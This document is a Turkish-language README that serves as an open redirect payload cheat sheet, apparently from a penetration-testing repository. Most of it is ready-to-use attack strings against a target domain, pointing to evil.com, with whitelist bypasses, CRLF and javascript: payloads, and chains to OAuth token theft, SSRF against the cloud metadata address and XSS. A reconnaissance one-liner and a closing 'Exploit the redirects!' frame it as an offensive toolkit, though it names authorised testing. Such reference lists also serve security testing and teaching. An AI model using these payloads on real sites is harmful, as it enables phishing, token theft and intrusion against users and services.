[🇬🇧 English](../../README.md)

# 🔀 Açık Yönlendirme (Open Redirect) Başvuru Kılavuzu

```
   ██████╗ ██████╗ ███████╗███╗   ██╗    ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗
  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝
  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   
  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   
  ╚██████╔╝██║     ███████╗██║ ╚████║    ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   
   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   
```

---

## 🎯 Açık Yönlendirme (Open Redirect) Nedir?

**Açık Yönlendirme (Open Redirect)** zafiyeti, bir web uygulamasının güvenilir alan adını kullanarak kullanıcıları saldırganın kontrolündeki zararlı sitelere yönlendirmesine olanak tanır. Genellikle oltalama (phishing) saldırılarında ve diğer güvenlik zafiyetleriyle zincirlenerek (chaining) kullanılır.

---

## 🔍 Yaygın Parametreler

```
url=
redirect=
redirect_uri=
redirect_url=
next=
next_url=
return=
return_url=
rurl=
dest=
destination=
redir=
redirect_uri=
return_to=
checkout_url=
continue=
image_url=
go=
view=
to=
out=
ref=
callback=
```

---

## 💉 Payload'lar (Saldırı Yükleri)

### Temel Payload'lar
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=http://evil.com
https://target.com/redirect?url=//evil.com
```

### Protokolsüz (Protocol-less) Yönlendirme
```
//evil.com
///evil.com
////evil.com
/\/evil.com
```

### @ Simgesi Kullanımı
```
https://target.com@evil.com
https://target.com%40evil.com
//target.com@evil.com
```

### Ters Eğik Çizgi (Backslash) Hileleri
```
https://evil.com\@target.com
//evil.com\@target.com
https://target.com/redirect?url=https://evil.com\.target.com
```

### URL Kodlaması (Encoding)
```
https://evil.com
https:%2f%2fevil.com
https:%252f%252fevil.com
%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

### Alan Adı Karışıklığı (Domain Confusion)
```
https://evil.com?.target.com
https://evil.com#.target.com
https://evil.com\.target.com
https://target.com.evil.com
https://targetcom.evil.com
```

### NULL Bayt Kullanımı
```
https://evil.com%00.target.com
https://evil.com%00@target.com
```

### CRLF Enjeksiyonu
```
https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com
```

### JavaScript ile Yönlendirme
```
javascript:alert(1)
javascript://target.com/%0d%0aalert(1)
data:text/html,<script>location='https://evil.com'</script>
```

---

## 🛡️ Atlama (Bypass) Teknikleri

### Beyaz Liste (Whitelist) Kontrolü Varsa
```
# Alt alan adı ile atlama
https://target.com.evil.com
https://evil.target.com
https://targetcom.evil.com

# Dizin yolu (path) ile atlama
https://target.com/https://evil.com
https://target.com//evil.com
```

### Yalnızca HTTPS'e İzin Veriliyorsa
```
https://evil.com
https://evil.com%2f%2ftarget.com
```

### Localhost / Yerel Ağ Hileleri
```
http://localhost
http://127.0.0.1
http://[::1]
```

---

## 🔗 Açık Yönlendirmeleri Zincirleme (Chaining)

### OAuth Belirteci (Token) Hırsızlığı
```
https://target.com/oauth?redirect_uri=https://evil.com
→ OAuth erişim belirteçlerini çalma
```

### SSRF ile Zincirleme
```
https://target.com/redirect?url=http://169.254.169.254/
```

### XSS ile Zincirleme
```
https://target.com/redirect?url=javascript:alert(document.domain)
```

---

## 📊 Hızlı Başvuru

| Payload Türü | Örnek |
|--------------|-------|
| Temel | `//evil.com` |
| @ Simgesi | `https://target.com@evil.com` |
| Kodlama (Encoding) | `https:%2f%2fevil.com` |
| Alan adı karışıklığı | `https://target.com.evil.com` |
| JavaScript | `javascript:alert(1)` |

---

## 🛠️ Araçlar

```bash
# GF kalıpları ile tespit
gau target.com | gf redirect

# Manuel test
echo "https://target.com/r?url=FUZZ" | \
  qsreplace "https://evil.com" | \
  httpx -silent -location
```

---

## 📚 Kaynaklar

- [PortSwigger Open Redirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

---

<p align="center">
  <b>🔀 Yönlendirmeleri İstismar Edin!</b><br>
  <i>Yalnızca yetkili ve yasal testler içindir!</i>
</p>
